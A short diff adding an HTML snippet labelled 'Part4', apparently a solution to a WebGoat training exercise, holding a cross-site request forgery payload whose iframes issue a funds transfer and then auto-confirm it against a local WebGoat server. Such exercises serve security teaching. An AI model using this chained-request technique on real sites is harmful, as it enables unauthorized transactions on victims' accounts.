@@ -1,0 +1,9 @@
+Part4:
+
+<iframe src="http://localhost:8090/WebGoat/attack?Screen=293&menu=900&transferFunds=5000" 
+frameborder="1" width="800" scrolling=yes height="300"
+onload="document.getElementById('Second').src='http://localhost:8090/WebGoat/attack?Screen=293&menu=900&transferFunds=CONFIRM';">
+</iframe>
+
+<iframe id="Second" frameborder="1" width="800" scrolling=yes height="300">
+</iframe>
